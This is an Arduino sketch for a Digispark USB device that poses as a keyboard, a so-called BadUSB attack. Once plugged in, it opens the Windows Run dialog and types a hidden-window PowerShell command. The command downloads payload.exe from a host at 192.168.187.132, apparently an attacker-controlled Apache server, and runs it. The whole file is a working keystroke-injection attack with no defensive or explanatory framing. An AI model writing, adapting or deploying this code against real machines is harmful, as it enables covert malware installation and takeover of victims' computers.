#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0); // Initialize

  // Open Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(500);

  // PowerShell command to download from Apache2 and run it
  DigiKeyboard.print("powershell -WindowStyle Hidden -Command ");
  delay(1000);
  DigiKeyboard.print("\"Invoke-WebRequest http://192.168.187.132/payload.exe -OutFile $env:TEMP\\payload.exe; Start-Process $env:TEMP\\payload.exe\"");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
}

void loop() {
  // Do nothing
}
